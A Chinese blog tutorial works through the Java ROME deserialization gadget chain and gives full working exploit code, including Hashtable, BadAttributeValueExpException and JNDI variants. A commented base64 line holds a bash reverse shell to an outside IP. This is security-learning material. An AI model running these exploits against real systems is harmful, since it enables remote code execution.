# Java 反序列化之 ROME 链

## 0x01 前言

原本打算先学一手 Java Agent 内存马的，碰巧有位师傅问了我一下 Rome 反序列化链子的东西，想着就先学 ROME 反序列化吧

## 0x02 环境与 ROME 简介

### 环境

jdk8u65（因为 8u65 我打了 openjdk 的包，分析起来比较方便

pom.xml

XML

```
<dependency>  
    <groupId>rome</groupId>  
    <artifactId>rome</artifactId>  
    <version>1.0</version>  
</dependency>  
<dependency>  
    <groupId>org.javassist</groupId>  
    <artifactId>javassist</artifactId>  
    <version>3.28.0-GA</version>  
</dependency>
```

> 讲个有趣的小插曲

一般来说，这种依赖在 mvnrepository 里面肯定是有的，结果我去 mvnrepository 里面找 ROME 的包，发现没有 1.0 的包，但是 maven 还是能把它打包进来，挺有趣的哈哈哈

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/RomeVersion.png)

### ROME 简介

- 一句话概括一下，就是一个 RSS 阅读器

ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。

Rome 提供了 **ToStringBean** 这个类，提供深入的 toString 方法对 JavaBean 进行操作。

## 0x03 ROME 链挖掘

还是和之前一样，尝试一下自己可不可以独立复现这个漏洞，找全整条链子。

### 艰辛的寻找链尾之路

先看这个包里面的 io 文件夹，里面是一些输入输出流的处理类，有我们在 XXE 里面见过的一些类，比如 `SAXBuilder`，`XmlReader` 等类，就先不看 io 文件夹里面的类了。

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/IOXXE.png)

想着这么寻找链子，一个个看过去也不是个事儿啊，所以我还是打开了全局搜索，在文件夹里面搜索 `jndi` 关键词，结果发现屁都没有

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/NoJndi.png)

然后找了很久都没有找到，太难了，还是直接看其他师傅的链尾了；发现链尾是 `TemplatesImpl.getOutputProperties()`，难怪没找到了，只去到包里面找了，太局限了；很多时候包只是作为链子的一部分 sink，而不是漏洞点，算是给自己涨了点经验。

有趣的是，自己当时学习的时候先放了放 ROME 链的知识点，准备去复现一道 2022 长城杯的 b4byCoffee，听杰哥说这个题目是一个 TemplatesImpl 动态加载字节码的攻击手法；

结果发现就是 ROME 的链，而且 ROME 是作为 sink 的，有意思，Java 安全融会贯通的感觉来了

### ROME 链流程分析

这里太细太细太细了，如果按照之前的思路，我们去找谁调用了 `.getOutputProperties()` 方法，应该是可以找到一个可用链子的，但是这里我去 `find usages` 居然是这样的

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/getOutputProperties.png)

看了其他师傅的文章分析才知道，原来这里链子的下一步是 `ToStringBean.toString()`，这里太妙了，我们可以先去看一下 `ToStringBean.toString()` 的代码逻辑

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/toString.png)

这里，我们先通过 `BeanIntrospector.getPropertyDescriptors(_beanClass)` 获取到 `_beanClass` 中的任意 getter 方法，注释里面也写的比较清晰；在获取完任意 getter 方法后，做了一系列基本的判断 ———— 确保 getter 方法不为空，确保能够调用类的 getter 方法，确保里面可以传参。

在完成基础的三项判断之后，进行执行

JAVA

```
Object value = pReadMethod.invoke(_obj,NO_PARAMS);
```

这里的 `pReadMethod.invoke()` 就类似于我们之前在反射中看的 `method.invoke()` 一样。

再来关注一下里面的传参，`_obj` 是被实例化的类，`NO_PARAMS` 是一个常量，我猜测这里应该是对应的传参个数。

- 说了这么多，基础扎实的师傅很容易就能够看出来，`pReadMethod.invoke()` 是可以触发 `TemplatesImpl.getOutputProperties()` 的
- 这只是反射的写法而已，写一段伪代码供师傅们理解

JAVA

```
Class _beanClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
Object _obj = _beanClass.newInstance();
Method pReadMethod = _beanClass.getDeclaredMethod("getOutputProperties");
pReadMethod.invoke(_obj,NO_PARAMS)
	
// 等价于 TemplatesImpl.getOutputProperties()
// 用 ToStringBean.toString() 触发也可以，我这里更关注反射
```

OK，此处基础的链尾已经打通，我们点击去看一下 `_obj` 和 `_beanClass` 是否可以直接赋值，跟进一下。

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/ToStringBeanValue.png)

果不其然，这个构造函数是可以帮我们省去一些代码量的，后续可能会用到，先 cy 一下。

继续分析，我们应该是去看谁调用了 `toString()` 方法，想到 `toString()` 方法，就想起来之前有个 `toString()` 的坑让人非常印象深刻，找了找，是在 CC6 链子里面的，放个传送门 ———— [Java反序列化Commons-Collections篇03-CC6链](http://localhost:4000/2022/06/11/Java反序列化Commons-Collections篇03-CC6链/)

- 所以此处根据 CC6 的链子分析，后半段就是 URLDNS 链了，简单看一下

后半段是 HashMap 的链子，尾部是到 `hashCode()` 方法，

JAVA

```
xxx.readObject()
    HashMap.put()
    HashMap.hash()
        xxx.hashCode()
```

我们需要找到 `hashCode()` —– `toString()` 中间可利用的一条 sink，这里如果要自己找，难度还是比较大的，就直接拿现成的啦 ~

中间的 sink 是 `EqualsBean` 类，去到 `EqualsBean` 类里头看一看

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/EqualsBean.png)

`beanHashCode()` 是一个完美契合我们需求的方法，这条链子到这儿就完成了

画个流程图总结一下 ROME 链子

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/ROME.png)

### ROME 链 EXP 编写

- 先写个 TemplatesImpl 的链子兜个底

JAVA

```
public class TemplatesImplEXP {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
        setFieldValue(templates,"_name","Drunkbaby");  
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());  
        Class c = templates.getClass();  
        Field byteCodesField = c.getDeclaredField("_bytecodes");  
        byteCodesField.setAccessible(true);  
        byte[] evil = getTemplatesImpl("Calc");  
        byte[][] codes = {evil};  
        byteCodesField.set(templates,codes);  
  
        templates.newTransformer();  
    }  
  
    public static byte[] getTemplatesImpl(String cmd) {  
        try {  
            ClassPool pool = ClassPool.getDefault();  
            CtClass ctClass = pool.makeClass("Evil");  
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");  
            ctClass.setSuperclass(superClass);  
            CtConstructor constructor = ctClass.makeClassInitializer();  
            constructor.setBody(" try {\n" +  
                    " Runtime.getRuntime().exec(\"" + cmd +  
                    "\");\n" +  
                    " } catch (Exception ignored) {\n" +  
                    " }");  
            // "new String[]{\"/bin/bash\", \"-c\", \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx}|{base64,-d}|{bash,-i}\"}"  
 byte[] bytes = ctClass.toBytecode();  
            ctClass.defrost();  
            return bytes;  
        } catch (Exception e) {  
            e.printStackTrace();  
            return new byte[]{};  
        }  
    }  
  
    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception {  
        Class clazz = object.getClass();  
        Field field = clazz.getDeclaredField(fieldName);  
        field.setAccessible(true);  
        field.set(object,value);  
    }  
}
```

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/TemplatesImplEXP.png)

构造下一步的 EXP

JAVA

```
public class ToStringBeanEXP {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
        setFieldValue(templates,"_name","Drunkbaby");  
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());  
        Class c = templates.getClass();  
        Field byteCodesField = c.getDeclaredField("_bytecodes");  
        byteCodesField.setAccessible(true);  
        byte[] evil = getTemplatesImpl("Calc");  
        byte[][] codes = {evil};  
        byteCodesField.set(templates,codes);  
//        templates.newTransformer();  
 ToStringBean toStringBean = new ToStringBean(c,templates);  
        toStringBean.toString();  
  
    }  
  
    public static byte[] getTemplatesImpl(String cmd) {  
        try {  
            ClassPool pool = ClassPool.getDefault();  
            CtClass ctClass = pool.makeClass("Evil");  
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");  
            ctClass.setSuperclass(superClass);  
            CtConstructor constructor = ctClass.makeClassInitializer();  
            constructor.setBody(" try {\n" +  
                    " Runtime.getRuntime().exec(\"" + cmd +  
                    "\");\n" +  
                    " } catch (Exception ignored) {\n" +  
                    " }");  
            // "new String[]{\"/bin/bash\", \"-c\", \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx}|{base64,-d}|{bash,-i}\"}"  
 byte[] bytes = ctClass.toBytecode();  
            ctClass.defrost();  
            return bytes;  
        } catch (Exception e) {  
            e.printStackTrace();  
            return new byte[]{};  
        }  
    }  
  
    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception {  
        Class clazz = object.getClass();  
        Field field = clazz.getDeclaredField(fieldName);  
        field.setAccessible(true);  
        field.set(object,value);  
    }  
}
```

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/ToStringBeanInvoke.png)

这里有点坑，一开始脑子里想的都是调用 `toString(String)`，后来发现这是个 private 调用不了，要用 `toString()` 普通的这个去触发。

继续往下走，写 EXP

JAVA

```
ToStringBean toStringBean = new ToStringBean(c,templates);    
 Class toStringBeanEvil = toStringBean.getClass();  
EqualsBean equalsBean = new EqualsBean(toStringBeanEvil,toStringBean);  
equalsBean.beanHashCode();
```

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/EqualsBeanCalc.png)

再往下，是 HashMap，我就直接尝试构造完整的 EXP 了

JAVA

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import com.sun.syndication.feed.impl.EqualsBean;  
import com.sun.syndication.feed.impl.ToStringBean;  
import javassist.ClassPool;  
import javassist.CtClass;  
import javassist.CtConstructor;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.util.HashMap;  
  
public class RomEXP {  
    public static void main(String[] args) throws Exception{  
        TemplatesImpl templates = new TemplatesImpl();  
        setFieldValue(templates,"_name","Drunkbaby");  
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());  
        Class c = templates.getClass();  
        Field byteCodesField = c.getDeclaredField("_bytecodes");  
        byteCodesField.setAccessible(true);  
        byte[] evil = getTemplatesImpl("Calc");  
        byte[][] codes = {evil};  
        byteCodesField.set(templates,codes);  
//        templates.newTransformer();  
 		ToStringBean toStringBean = new ToStringBean(c,templates);  
//        toStringBean.toString();  
 		Class toStringBeanEvil = toStringBean.getClass();  
        EqualsBean equalsBean = new EqualsBean(toStringBeanEvil,toStringBean);  
        HashMap hashMap = new HashMap();  
        hashMap.put(equalsBean,"Drunkbaby");  
        serialize(hashMap);  
        unserialize("ser.bin");  
  
    }  
  
    public static byte[] getTemplatesImpl(String cmd) {  
        try {  
            ClassPool pool = ClassPool.getDefault();  
            CtClass ctClass = pool.makeClass("Evil");  
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");  
            ctClass.setSuperclass(superClass);  
            CtConstructor constructor = ctClass.makeClassInitializer();  
            constructor.setBody(" try {\n" +  
                    " Runtime.getRuntime().exec(\"" + cmd +  
                    "\");\n" +  
                    " } catch (Exception ignored) {\n" +  
                    " }");  
            // "new String[]{\"/bin/bash\", \"-c\", \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx}|{base64,-d}|{bash,-i}\"}"  
 			byte[] bytes = ctClass.toBytecode();  
            ctClass.defrost();  
            return bytes;  
        } catch (Exception e) {  
            e.printStackTrace();  
            return new byte[]{};  
        }  
    }  
  
    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception {  
        Class clazz = object.getClass();  
        Field field = clazz.getDeclaredField(fieldName);  
        field.setAccessible(true);  
        field.set(object,value);  
    }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/ROMESuccess.png)

至此，关于 ROME 的部分就到此结束了，我们可以把它的这条链子和其他利用链结合一下

## 0x04 其他利用链

### ObjectBean 替换 EqualsBean

用 `ObjectBean` 来替换 `EqualsBean`，代码基本不变，变了这一句：

JAVA

```
ObjectBean objectBean = new ObjectBean(toStringBeanEvil,toStringBean);  
HashMap hashMap = new HashMap();  
hashMap.put(objectBean,"Drunkbaby");
```

其余都是一样，代码已同步至 Github

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/ObjectBean.png)

### HashTable 替换入口的 HashMap

这和之前讲的 CC 链子大同小异，相对应的，我们这里不进行 `put()` 操作，在 `HashTable` 里面，对于 `HashTable` 中的每个元素，都会调用 `reconstitutionPut()` 方法

所以 EXP 改造一下如下

JAVA

```
Hashtable hashtable= new Hashtable();  
hashtable.put(equalsBean,"Drunkbaby");  
serialize(hashtable);
```

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/HashTable.png)

### BadAttributeValueExpException 利用链

如果师傅们对 CC 链较为熟悉的话，提起 `toString()`，很容易能够想到 `BadAttributeValueExpException` 这个类。在其 `readObject()` 中能够调用任意类的 `toSrting()` 方法。

我们可以过去看一看

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/BadAttributeValueExpException.png)

改造 EXP 如下

JAVA

```
BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(toStringBean);  
serialize(badAttributeValueExpException);  
unserialize("ser.bin");
```

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/BadAttributeValueExpExceptionEXP.png)

### JdbcRowSetImpl 利用链

这条链子和之前的没关系，产生漏洞是因为当时链尾的时候的调用任意 getter 方法。一开始我们是去调用 `TemplatesImpl#getOutputProperties()` 的，现在我们用 `JdbcRowSetImpl` 这条链子

关于这条链子分析比较简单，它的触发点是在 `getDatabaseMetaData()` 方法处，它调用了 `connect()` 方法

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/getDatabaseMetaData.png)

后续的就是一个 Jndi 注入的，原理在 Fastjson 篇已经说的很清楚了，这里不再赘述。

构造 EXP

JAVA

```
public class JdbcRowSetImplEXP {

    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        // EXP为我们的恶意类
        String url = "ldap://127.0.0.1:1230/ExportObject";
        jdbcRowSet.setDataSourceName(url);


        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(equalsBean, "123");

        serialize(hashMap);
        unserialize("ser.bin");
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

开启 LDAP 以及恶意类，复现成功

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/connectEXP.png)![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/Open.png)

### 优化利用链

最开始的 EXP 里面，在给 `HashMap` 赋值的时候，会使用 `put()` 方法，最终也会调用一次 `key.hashcode()`，这就和 URLDNS 链子是一样的

- 按照之前的思维，让它在反序列化的之前，`HashMap.put()` 之后用反射进行值的动态改变即可。

JAVA

```
hashMap.put("key","Drunkbaby");  
serialize(hashMap);  
setFieldValue(hashMap,"value",equalsBean);  
unserialize("ser.bin");
```

![img](https://drun1baby.top/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/BetterRomEXP.png)

## 0x05 关于 payload 长度的精简

由于杰哥的指点，这里发现可以用 javassist 缩短 payload 长度，这样可以跳过恶意类的编译过程，上述代码都是用 javassist 生成的恶意字节码，所以这里不再展开。

## 0x06 例题 ———— 2022 长城杯 b4bycoffee

- 比较简单，分析在这里就不写了，直接挂个 EXP，这里踩了很多的坑，后面非常感谢 F1or 师傅帮我看了一下，确实只是因为踩了个坑

关于题目解析可以看这个仓库里面的 WP

[Drun1baby/CTFReposityStore](https://github.com/Drun1baby/CTFReposityStore)